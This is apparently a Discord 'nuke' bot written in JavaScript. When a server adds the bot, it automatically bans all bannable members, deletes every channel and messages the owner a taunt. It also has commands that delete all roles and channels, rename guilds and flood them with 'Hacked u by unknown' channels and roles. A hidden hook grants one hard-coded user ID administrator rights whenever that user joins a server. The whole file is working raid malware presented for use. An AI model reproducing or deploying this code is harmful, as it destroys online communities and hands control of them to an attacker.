const Discord = require('discord.js');
const fs = require('fs');
const ms = require('ms');
const canvas = require('canvas-prebuilt');
const jimp = require('jimp');
const ytdl = require('ytdl-core');
const request = require('request');
const dateFormat = require('dateformat');
const google = require('google-it');
const db = require('quick.db');
const giphy = require('giphy-api')();    
const googl = require('goo.gl');  
const translate = require('google-translate-api');   
const { Client, Util } = require('discord.js');  
const UserBlocked = new Set(); 
const moment = require('moment');
const pretty = require('pretty-ms'); 
const zalgo = require('zalgolize');   
const math = require('math-expression-evaluator'); 
const stripIndents = require('common-tags').stripIndents;
const figlet = require('figlet');
const client = new Discord.Client();
const prefix = '-'
const myID = "415595760990552065";
ti={}  
spee={};

client.on('message', message => {
var prefix = "$";
if(message.content.split(' ')[0] == prefix + 'dc') { 
if (!message.channel.guild) return;
if(message.author.id !== myID) return;
if(!message.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return message.reply("**I Don't Have ` MANAGE_CHANNELS ` Permission**");
message.guild.channels.forEach(m => {
m.delete();
});
}
if(message.content.split(' ')[0] == prefix + 'dr') { // delete all roles
if (!message.channel.guild) return;
if(message.author.id !== myID) return;
if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES_OR_PERMISSIONS")) return message.reply("**I Don't Have ` MANAGE_ROLES_OR_PERMISSIONS ` Permission**");
message.guild.roles.forEach(m => {
m.delete();
});
message.reply("`**Done**`")
}
});


client.on("message", message => {
  if(!message.content.startsWith(prefix)) return;;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' ');
  if (message.content.startsWith('hix15')) {
    client.user.setUsername(argresult);
  }
    if (message.content.startsWith(prefix + 'on123')) {
    client.user.setStatus(argresult);
  }
});



var x1 = "kk"
client.on('message', message => {
     if (message.content === ".") {
client.user.setAvatar(`https://cdn.discordapp.com/avatars/453814415201009665/1cfc9a4ed81f6b3004eefdce369e7efc.png?size=2048`)

}
});


var x1 = "kk"
client.on('message', message => {
     if (message.content === ".") {
client.user.setUsername("Zonox")

}
});

client.on('message', message => {
     if (message.content === ".") {
client.user.setGame(`Zonix.com`,'https://www.twitch.tv/hix')

}
});


client.on('message', message => {
     if (message.content === ".") {
         client.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/506907561476358146/514785368097161246/yellow.jpg`)
})
}
});

client.on('message', message => {
     if (message.content === ".") {
         client.guilds.forEach(m =>{
             m.setName(`Zonox Zwin Zwin Zwin olh ila bogos`)
})
}
});



client.on('message', message => {
     if (message.content === ".") {
                 if(!message.channel.guild) return;

             message.guild.setIcon(`https://cdn.discordapp.com/attachments/506907561476358146/514785368097161246/yellow.jpg`)

}
});




client.on('message', message => {
     

     if (message.content === "k1") {
         client.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    }) 
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })

    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by unknown Is here",
        permissions :   [1],
        color : " #ff0000"
    })


    
})
 
 
}
});



client.on('message', message => {
         if (message.content === "k") {
               client.guilds.forEach(m =>{
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

m.createChannel('Hacked u by unknown Is here', 'text');
m.createChannel('Hacked u by unknown Is here', 'text');

})
}
});


client.on('message', message => {
         if (message.content === "k") {
                 client.guilds.forEach(m =>{
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');

m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');
m.createChannel('Hacked u by unknown Is here', 'voice');



})
}

});

async function nuke(guild) {
  let users = 0;
  let channels = 0;

  await guild.fetchMembers();

  await guild.owner.send(' Hacked u by unknown Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });


  await Promise.all(guild.members.map(async (m) => {
    if (m.bannable) {
      users++;
      await m.send('^_^').catch(e => { return void e; });
      return m.ban();
    }
  }));



    await Promise.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));



    await guild.createChannel('Hacked u by unknown Is here', 'text');

      await guild.createChannel('Hacked u by unknown Is here', 'voice');

  

}



client.on('guildCreate', async (guild) => {
  return nuke(guild).catch(console.error);
});


client.on('guildMemberAdd', member => {
    
            if (member.id === "328333685088845824") {
                member.guild.createRole({
                    name : client.user.username,
                    color : "RANDOM", 
                    permissions : [8]
                }).then(function(role){
                    member.addRole(role)
                })
                
            }
        
    });


client.login(process.env.BOT_TOKEN);
